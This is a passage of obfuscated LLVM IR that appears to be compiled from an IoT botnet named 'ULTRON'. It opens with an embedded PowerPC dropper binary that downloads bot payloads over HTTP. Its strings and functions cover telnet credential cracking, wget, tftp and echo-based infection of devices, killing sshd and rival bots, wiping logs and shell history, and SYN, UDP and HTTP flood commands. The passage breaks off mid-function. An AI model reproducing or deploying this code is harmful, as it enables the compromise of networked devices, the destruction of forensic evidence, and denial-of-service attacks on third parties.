<\80\10\008`\00\018\84\04t8\A0\00\04K\FF\FEu|\7F\00\D0K\FF\FD\A1;\BD\00\1D<\80\10\008\84\04|\7F\C3\F3x\7F\A5\EBxK\FF\FEU\7F\83\E8\00A\9E\00\0C8`\00\03K\FF\FDy;\A0\00\008\81\00\088\A0\00\01\7F\C3\F3xK\FF\FEi/\83\00\018`\00\04A\9E\00\08K\FF\FDU\89a\00\08W\A9@.<\00\0D\0A`\00\0D\0A}=[x\7F\9D\00\00@\9E\FF\C8;\A1\00\1C8\A0\00\80\7F\A4\EBx\7F\C3\F3xK\FF\FE)\7F\A4\EBx|e\1By\7F\83\E3x@\81\00\0CK\FF\FD\DDK\FF\FF\D8\7F\C3\F3xK\FF\FD1\7F\83\E3xK\FF\FD)<\80\10\008\84\04\A88\A0\00\048`\00\01K\FF\FD\B58`\00\05K\FF\FC\E1\80\01\00\C4\BB\81\00\B08!\00\C0|\08\03\A6N\80\00 K\FF\FE@|`\1Bx|\83#x|\A4+x|\C53x|\E6;x}\07CxD\00\00\02L\83\00 H\00\00\04\94!\FF\E0|\08\02\A6\BF\A1\00\14|}\1Bx\90\01\00$H\00\00!\93\A3\00\008`\FF\FF\80\01\00$\BB\A1\00\148!\00 |\08\03\A6N\80\00 <`\10\018c\04\B0N\80\00 powerpc440fp\00\00\00\00ULTRON\0A\00dvrHelper\00\00\00NIF\0A\00\00\00\00GET /bins/ultron.powerpc440fp HTTP/1.0\0D\0A\0D\0A\00\00FIN\0A\00\00\00\00\00GCC: (GNU) 4.1.2\00\00GCC: (GNU) 4.1.2\00\00GCC: (GNU) 4.1.2\00\00GCC: (GNU) 4.1.2\00\00.symtab\00.strtab\00.shstrtab\00.text\00.rodata\00.sbss\00.comment\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\1B\00\00\00\01\00\00\00\06\10\00\00\94\00\00\00\94\00\00\03\BC\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00!\00\00\00\01\00\00\002\10\00\04P\00\00\04P\00\00\00`\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00)\00\00\00\08\00\00\00\03\10\01\04\B0\00\00\04\B0\00\00\00\08\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00/\00\00\00\01\00\00\00\00\00\00\00\00\00\00\04\B0\00\00\00H\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\11\00\00\00\03\00\00\00\00\00\00\00\00\00\00\04\F8\00\00\008\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\01\00\00\00\02\00\00\00\00\00\00\00\00\00\00\06p\00\00\02@\00\00\00\07\00\00\00\0D\00\00\00\04\00\00\00\10\00\00\00\09\00\00\00\03\00\00\00\00\00\00\00\00\00\00\08\B0\00\00\015\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\10\00\00\94\00\00\00\00\03\00\00\01\00\00\00\00\10\00\04P\00\00\00\00\03\00\00\02\00\00\00\00\10\01\04\B0\00\00\00\00\03\00\00\03\00\00\00\00\00\00\00\00\00\00\00\00\03\00\00\04\00\00\00\00\00\00\00\00\00\00\00\00\03\00\00\05\00\00\00\00\00\00\00\00\00\00\00\00\03\00\00\06\00\00\00\00\00\00\00\00\00\00\00\00\03\00\00\07\00\00\00\01\00\00\00\00\00\00\00\00\04\00\FF\F1\00\00\00\07\00\00\00\00\00\00\00\00\04\00\FF\F1\00\00\00,\00\00\00\00\00\00\00\00\04\00\FF\F1\00\00\00>\00\00\00\00\00\00\00\00\04\00\FF\F1\00\00\00Q\00\00\00\00\00\00\00\00\04\00\FF\F1\00\00\00Y\10\01\04\B4\00\00\00\04\11\02\00\03\00\00\00f\10\00\01\08\00\00\008\12\00\00\01\00\00\00l\10\00\03\EC\00\00\00$\12\00\00\01\00\00\00t\10\01\04\B4\00\00\00\04!\00\00\03\00\00\00}\10\01\04\B0\00\00\00\04\11\00\00\03\00\00\00\83\10\00\00\DC\00\00\00,\12\00\00\01\00\00\00\8A\10\00\00\B0\00\00\00,\12\00\00\01\00\00\00\92\10\00\01\EC\00\00\00<\12\00\00\01\00\00\00\9A\10\01\04\B4\00\00\00\04\11\00\00\03\00\00\00\A2\10\00\00\94\00\00\00\1C\12\00\00\01\00\00\00\B2\10\00\03\E8\00\00\00\04\12\00\00\01\00\00\00\BA\10\00\01|\00\00\008\12\00\00\01\00\00\00\C1\10\00\01@\00\00\00<\12\00\00\01\00\00\00\CA\10\00\04\10\00\00\004\12\02\00\01\00\00\00\DA\10\01\04\B0\00\00\00\00\10\00\FF\F1\00\00\00\E6\10\00\02(\00\00\01\C0\12\00\00\01\00\00\00\EA\10\00\01\B4\00\00\008\12\00\00\01\00\00\00\F0\10\01\04\B0\00\00\00\00\10\00\FF\F1\00\00\00\F7\10\01\04\B8\00\00\00\00\10\00\FF\F1\00\00\00\FC\10\00\04D\00\00\00\0C\22\00\00\01\00\00\01\0D\10\01\04\B0\00\00\00\04!\00\00\03\00\00\01\14\10\01\04\B0\00\00\00\04\11\02\00\03\00\00\01\1F\10\00\04D\00\00\00\0C\22\02\00\01\00dlr.c\00libc/sysdeps/linux/powerpc/syscall.S\00__syscall_error.c\00__errno_location.c\00errno.c\00__GI_h_errno\00xopen\00syscall\00_h_errno\00errno\00xclose\00x__exit\00xsocket\00h_errno\00utils_inet_addr\00__start\00xwrite\00xconnect\00__syscall_error\00__bss_start\00run\00xread\00_edata\00_end\00__errno_location\00_errno\00__GI_errno\00__GI___errno_location\00\00", align 1
@scanPid = common global i32 0, align 4
@.str.232 = private unnamed_addr constant [13 x i8] c"kill -9 %s\0D\0A\00", align 1
@.str.233 = private unnamed_addr constant [30 x i8] c"killall -9 sshd;pkill -9 sshd\00", align 1
@.str.234 = private unnamed_addr constant [19 x i8] c"ps -C sshd -o pid=\00", align 1
@.str.235 = private unnamed_addr constant [11 x i8] c"kill -9 %s\00", align 1
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.327 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.261 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.262 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@getRandomPublicIP.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.263 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.276 = private unnamed_addr constant [5 x i8] c"%s\0D\0A\00", align 1
@.str.277 = private unnamed_addr constant [41 x i8] c"[TELNET] [+] LOGIN CRACKED ---> %s:%s:%s\00", align 1
@.str.278 = private unnamed_addr constant [28 x i8] c"sh\0D\0Ashell\0D\0Asystem\0D\0Aenable\0D\0A\00", align 1
@.str.279 = private unnamed_addr constant [42 x i8] c">%s.ULTRON && cd %s >ULTRON && >.ULTRON\0D\0A\00", align 1
@.str.280 = private unnamed_addr constant [24 x i8] c"/bin/busybox uname -a\0D\0A\00", align 1
@.str.281 = private unnamed_addr constant [4 x i8] c"arm\00", align 1
@.str.282 = private unnamed_addr constant [41 x i8] c"/bin/busybox wget || /bin/busybox tftp\0D\0A\00", align 1
@.str.283 = private unnamed_addr constant [5 x i8] c"echo\00", align 1
@.str.284 = private unnamed_addr constant [44 x i8] c"[ULTRON] Attempting wget infecton: %s:%s:%s\00", align 1
@.str.285 = private unnamed_addr constant [45 x i8] c"[ULTRON] Attempting tftp infection: %s:%s:%s\00", align 1
@.str.286 = private unnamed_addr constant [44 x i8] c"[ULTRON] Attempting echo infecton: %s:%s:%s\00", align 1
@.str.287 = private unnamed_addr constant [39 x i8] c"/bin/busybox echo -e '%s' >> dropper\0D\0A\00", align 1
@.str.288 = private unnamed_addr constant [41 x i8] c"[ULTRON] Failed echo infection: %s:%s:%s\00", align 1
@.str.289 = private unnamed_addr constant [28 x i8] c"[ULTRON] Finished: %s:%s:%s\00", align 1
@.str.290 = private unnamed_addr constant [4 x i8] c"std\00", align 1
@.str.291 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.292 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.293 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.294 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.295 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@.str.296 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.297 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.298 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.299 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.300 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.301 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.302 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.303 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.304 = private unnamed_addr constant [26 x i8] c"cd /;rm -rf .bash_history\00", align 1
@.str.305 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.306 = private unnamed_addr constant [7 x i8] c"TELNET\00", align 1
@.str.307 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.308 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.309 = private unnamed_addr constant [9 x i8] c"FASTLOAD\00", align 1
@.str.310 = private unnamed_addr constant [22 x i8] c"SCAN <threads> <usec>\00", align 1
@.str.311 = private unnamed_addr constant [19 x i8] c"Starting scanner!!\00", align 1
@.str.312 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.313 = private unnamed_addr constant [5 x i8] c"UATK\00", align 1
@.str.314 = private unnamed_addr constant [5 x i8] c"TATK\00", align 1
@.str.315 = private unnamed_addr constant [5 x i8] c"SATK\00", align 1
@.str.316 = private unnamed_addr constant [13 x i8] c"FUCKALLOFYOU\00", align 1
@.str.317 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.318 = private unnamed_addr constant [6 x i8] c"LMFAO\00", align 1
@.str.319 = private unnamed_addr constant [16 x i8] c"CLEANTHATSHITUP\00", align 1
@.str.320 = private unnamed_addr constant [19 x i8] c"[cleaning] [%s:%s]\00", align 1
@.str.321 = private unnamed_addr constant [17 x i8] c"/etc/resolv.conf\00", align 1
@.str.322 = private unnamed_addr constant [39 x i8] c"nameserver 8.8.8.8\0Anameserver 8.8.4.4\0A\00", align 1
@.str.323 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.324 = private unnamed_addr constant [29 x i8] c"\1B[34m[\1B[31mUltron\1B[34m] [%s]\00", align 1
@.str.325 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.326 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define void @bot_killer() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %1, align 4
  %switchVar = alloca i32
  store i32 -985493906, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -985493906, label %2
    i32 -646457247, label %6
    i32 -1678630868, label %19
    i32 -2115591490, label %22
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:2:                                      ; preds = %loopEntry
  %3 = load i32, i32* %1, align 4
  %4 = icmp slt i32 %3, 184
  %5 = select i1 %4, i32 -646457247, i32 -2115591490
  store i32 %5, i32* %switchVar
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i8, i8* @buf, align 1
  %8 = sext i8 %7 to i64
  %9 = inttoptr i64 %8 to i8*
  %10 = load i32, i32* %1, align 4
  %11 = sext i32 %10 to i64
  %12 = getelementptr inbounds [176 x i8*], [176 x i8*]* @Bot_Killer_Binarys, i64 0, i64 %11
  %13 = load i8*, i8** %12, align 8
  %14 = call i32 (i8*, i8*, ...) @sprintf(i8* %9, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.232, i32 0, i32 0), i8* %13) #5
  %15 = load i8, i8* @buf, align 1
  %16 = sext i8 %15 to i64
  %17 = inttoptr i64 %16 to i8*
  %18 = call i32 @system(i8* %17)
  store i32 -1678630868, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %1, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %1, align 4
  store i32 -985493906, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %19, %6, %2, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #1

declare i32 @system(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @port_closer() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.233, i32 0, i32 0))
  %2 = call i32 (i8*, i8*, ...) @sprintf(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @input, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.234, i32 0, i32 0)) #5
  %3 = call i32 @system(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @input, i32 0, i32 0))
  %4 = call i8* @strcpy(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @input, i32 0, i32 0), i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @output, i32 0, i32 0)) #5
  %5 = load i8, i8* @buf, align 1
  %6 = sext i8 %5 to i64
  %7 = inttoptr i64 %6 to i8*
  %8 = call i32 (i8*, i8*, ...) @sprintf(i8* %7, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @output, i32 0, i32 0)) #5
  %9 = load i8, i8* @buf, align 1
  %10 = sext i8 %9 to i64
  %11 = inttoptr i64 %10 to i8*
  %12 = call i32 @system(i8* %11)
  ret void
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  %switchVar = alloca i32
  store i32 -761717286, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -761717286, label %10
    i32 1082355420, label %14
    i32 559213914, label %32
    i32 -1350328959, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  %13 = select i1 %12, i32 1082355420, i32 -1350328959
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i32, i32* %3, align 4
  %16 = sub nsw i32 %15, 3
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %17
  %19 = load i32, i32* %18, align 4
  %20 = load i32, i32* %3, align 4
  %21 = sub nsw i32 %20, 2
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %22
  %24 = load i32, i32* %23, align 4
  %25 = xor i32 %19, %24
  %26 = xor i32 %25, -1640531527
  %27 = load i32, i32* %3, align 4
  %28 = xor i32 %26, %27
  %29 = load i32, i32* %3, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %30
  store i32 %28, i32* %31, align 4
  store i32 559213914, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %3, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %3, align 4
  store i32 -761717286, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %32, %14, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %.reg2mem2 = alloca i32
  %.reg2mem = alloca i32
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  store i32 %26, i32* %.reg2mem
  %27 = load i32, i32* @c, align 4
  store i32 %27, i32* %.reg2mem2
  %switchVar = alloca i32
  store i32 1854202506, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1854202506, label %first
    i32 1211199352, label %30
    i32 531274280, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %.reload3 = load volatile i32, i32* %.reg2mem2
  %28 = icmp ult i32 %.reload, %.reload3
  %29 = select i1 %28, i32 1211199352, i32 531274280
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32, i32* %3, align 4
  %32 = add i32 %31, 1
  store i32 %32, i32* %3, align 4
  %33 = load i32, i32* @c, align 4
  %34 = add i32 %33, 1
  store i32 %34, i32* @c, align 4
  store i32 531274280, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %4, align 4
  %37 = load i32, i32* %3, align 4
  %38 = sub i32 %36, %37
  %39 = load i32, i32* @rand_cmwc.i, align 4
  %40 = zext i32 %39 to i64
  %41 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %40
  store i32 %38, i32* %41, align 4
  ret i32 %38

loopEnd:                                          ; preds = %30, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  %switchVar = alloca i32
  store i32 121328811, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 121328811, label %8
    i32 425697717, label %17
    i32 1577894786, label %18
    i32 -909578115, label %19
    i32 -427698555, label %24
    i32 1784471833, label %34
    i32 1484598175, label %35
    i32 386160884, label %36
    i32 -518350596, label %39
    i32 652041115, label %40
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = add nsw i32 %10, 1
  store i32 %11, i32* %6, align 4
  %12 = sext i32 %11 to i64
  %13 = getelementptr inbounds i8*, i8** %9, i64 %12
  %14 = load i8*, i8** %13, align 8
  %15 = icmp ne i8* %14, null
  %16 = select i1 %15, i32 425697717, i32 1577894786
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 121328811, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 -909578115, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %7, align 4
  %21 = load i32, i32* %6, align 4
  %22 = icmp slt i32 %20, %21
  %23 = select i1 %22, i32 -427698555, i32 -518350596
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %4, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8*, i8** %26, i64 %28
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %25, i8* %30)
  %32 = icmp ne i32 %31, 0
  %33 = select i1 %32, i32 1784471833, i32 1484598175
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 1, i32* %3, align 4
  store i32 652041115, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  store i32 386160884, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %7, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %7, align 4
  store i32 -909578115, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 652041115, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %3, align 4
  ret i32 %41

loopEnd:                                          ; preds = %39, %36, %35, %34, %24, %19, %18, %17, %8, %switchDefault
  br label %loopEntry
}

declare i32 @strcasestr(...) #2

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([6 x i8*], [6 x i8*]* @successes, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @fails, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* %3)
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -392382260, i32* %switchVar
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -392382260, label %first
    i32 429608554, label %7
    i32 -1649659256, label %11
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp ne i32 %.reload, 0
  %6 = select i1 %5, i32 -1649659256, i32 429608554
  store i32 %6, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  %8 = load i8*, i8** %2, align 8
  %9 = call i32 @contains_fail(i8* %8)
  %10 = icmp ne i32 %9, 0
  store i32 -1649659256, i32* %switchVar
  store i1 %10, i1* %.reg2mem2
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %12 = zext i1 %.reload3 to i32
  ret i32 %12

loopEnd:                                          ; preds = %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.fd_set, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  %switchVar = alloca i32
  store i32 -646331899, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -646331899, label %18
    i32 348427346, label %27
    i32 -508448139, label %44
    i32 -885793224, label %45
    i32 -287125105, label %52
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %20 = getelementptr inbounds [16 x i64], [16 x i64]* %19, i64 0, i64 0
  %21 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %20) #5, !srcloc !1
  %22 = extractvalue { i64, i64* } %21, 0
  %23 = extractvalue { i64, i64* } %21, 1
  %24 = trunc i64 %22 to i32
  store i32 %24, i32* %12, align 4
  %25 = ptrtoint i64* %23 to i64
  %26 = trunc i64 %25 to i32
  store i32 %26, i32* %13, align 4
  store i32 348427346, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i32, i32* %6, align 4
  %29 = srem i32 %28, 64
  %30 = zext i32 %29 to i64
  %31 = shl i64 1, %30
  %32 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %33 = load i32, i32* %6, align 4
  %34 = sdiv i32 %33, 64
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %32, i64 0, i64 %35
  %37 = load i64, i64* %36, align 8
  %38 = or i64 %37, %31
  store i64 %38, i64* %36, align 8
  %39 = load i32, i32* %6, align 4
  %40 = add nsw i32 %39, 1
  %41 = call i32 @select(i32 %40, %struct.fd_set* %10, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %11)
  %42 = icmp slt i32 %41, 1
  %43 = select i1 %42, i32 -508448139, i32 -885793224
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -287125105, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %6, align 4
  %47 = load i8*, i8** %8, align 8
  %48 = load i32, i32* %9, align 4
  %49 = sext i32 %48 to i64
  %50 = call i64 @recv(i32 %46, i8* %47, i64 %49, i32 0)
  %51 = trunc i64 %50 to i32
  store i32 %51, i32* %5, align 4
  store i32 -287125105, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %5, align 4
  ret i32 %53

loopEnd:                                          ; preds = %45, %44, %27, %18, %switchDefault
  br label %loopEntry
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #2

declare i64 @recv(i32, i8*, i64, i32) #2

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %.reg2mem = alloca i32
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
